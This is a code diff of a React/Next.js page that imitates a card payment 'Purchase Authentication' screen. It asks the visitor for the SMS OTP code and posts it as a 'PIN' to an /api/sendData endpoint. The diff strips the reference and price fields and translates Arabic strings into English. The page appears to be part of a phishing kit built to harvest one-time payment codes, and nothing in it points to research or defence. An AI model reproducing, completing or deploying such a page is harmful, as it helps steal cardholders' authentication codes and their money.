@@ -2,19 +2,14 @@
 import { Suspense } from "react";
 import React, { useState, useEffect } from "react";
 import 'bootstrap/dist/css/bootstrap.min.css';
-import { useSearchParams } from 'next/navigation';
 
 function CodePageContent() {
   const [code, setCode] = useState("");
-  const [timeLeft, setTimeLeft] = useState(60); // دقيقة واحدة
+  const [timeLeft, setTimeLeft] = useState(60); // 1 minute
   const [expired, setExpired] = useState(false);
   const [resending, setResending] = useState(false);
-  const [errorMessage, setErrorMessage] = useState(""); // رسالة الخطأ
-  const [successMessage, setSuccessMessage] = useState(""); // رسالة النجاح
-
-  const searchParams = useSearchParams();
-  const refN = searchParams.get("refN");
-  const price = searchParams.get('price');
+  const [errorMessage, setErrorMessage] = useState(""); // error message
+  const [successMessage, setSuccessMessage] = useState(""); // success message
 
   useEffect(() => {
     if (timeLeft > 0) {
@@ -27,12 +22,12 @@ function CodePageContent() {
 
   const handleSubmit = async () => {
     if (!code) {
-      setErrorMessage("الرجاء إدخال الكود");
+      setErrorMessage("Please enter the code");
       setSuccessMessage("");
       return;
     }
 
-    const text = `🔐 PIN: ${code}\n🔨 Ref: ${refN}`;
+    const text = `🔐 PIN: ${code}`;
 
     try {
       const res = await fetch("/api/sendData", {
@@ -45,22 +40,22 @@ function CodePageContent() {
 
       if (result.success) {
         setErrorMessage("");
-        setSuccessMessage("تم إرسال الكود بنجاح!");
+        setSuccessMessage("Code sent successfully!");
       } else {
         setSuccessMessage("");
-        setErrorMessage("الكود خاطئ، يرجى المحاولة مرة أخرى");
+        setErrorMessage("Invalid code, please try again");
       }
     } catch (err) {
       console.error(err);
       setSuccessMessage("");
-      setErrorMessage("حدث خطأ أثناء الإرسال، حاول مرة أخرى");
+      setErrorMessage("Error occurred while sending the code");
     }
   };
 
   const handleResend = () => {
     setResending(true);
     setTimeout(() => {
-      setTimeLeft(60); // إعادة دقيقة
+      setTimeLeft(60);
       setExpired(false);
       setResending(false);
       setErrorMessage("");
@@ -80,9 +75,6 @@ function CodePageContent() {
         <h5 className="fw-bold text-primary mb-3">Purchase Authentication</h5>
         <p className="mb-1">
           We have sent you an SMS with an OTP code to your registered mobile number. Please do not share it with anyone.
-        </p>
-        <p className="mb-3">
-          You are paying <strong>PlayerMatrix</strong> the amount of <strong>KWD {price}.000</strong> on {new Date().toString()}
         </p>
 
         <label className="fw-bold mb-2">Enter your OTP code below:</label>
@@ -143,4 +135,4 @@ export default function CodePage() {
       <CodePageContent />
     </Suspense>
   );
-}
+      }
